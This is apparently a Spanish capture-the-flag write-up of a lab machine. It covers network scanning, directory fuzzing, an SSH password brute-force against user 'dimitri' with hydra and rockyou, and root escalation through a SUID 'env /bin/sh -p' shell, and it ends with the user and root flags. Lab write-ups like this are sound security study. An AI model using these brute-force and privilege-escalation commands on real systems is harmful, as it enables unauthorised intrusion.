
```bash
arp-scan -I eth0 --localnet
nmap -p- --open -sS -sC -sV --min-rate=5000 -vvv -n -Pn 10.0.2.23 -oN escaneo
gobuster dir -u http://10.0.2.23/ -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt 
hydra -t 64 -l dimitri -P /usr/share/wordlists/rockyou.txt ssh://10.0.2.23 -I
ssh dimitri@10.0.2.23
```
Primero de todo realizamos un arp-scan para encontrar la IP y una vez tengamos su IP realizamos un nmap y vemos que están abiertos los puertos 22, 80 y 631.![[Pasted image 20240310000302.png]]
Ahora entramos en la web aunque nos encontramos un apache por defecto y al realizar fuzzing con gobuster no encontramos nada reseñable, ahora miramos el puerto 631 y encontramos una especie de gestor de impresoras, una vez visto esto enontramos un posible usuario que es dimitri
![[Pasted image 20240310001147.png]]
Ahora usaremos hydra para atacar por fuerza bruta al usuario dimitri y nos da resultado tras esperar  un poco.![[Pasted image 20240310002421.png]]
Ahora entramos por ssh a la máquina y sacamos la flag de user
```bash
cat user.txt
find / -perm -4000 2>/dev/null
env /bin/sh -p
```
![[Pasted image 20240310002600.png]]Ahora enumeramos los SUID y vemos que env es raro que esté allí
![[Pasted image 20240310002707.png]]
Así que lo buscamos en gtfobins y encontramos un exploit para escalar privilegios con el que logramos ser usuario root y encontramos la flag de root.
![[Pasted image 20240310002940.png]]
Flag de user: f17d2f67c468d15600d8fc0b2ebc1d8c
Flag de root: 551df067bd06f13f1c092743493de034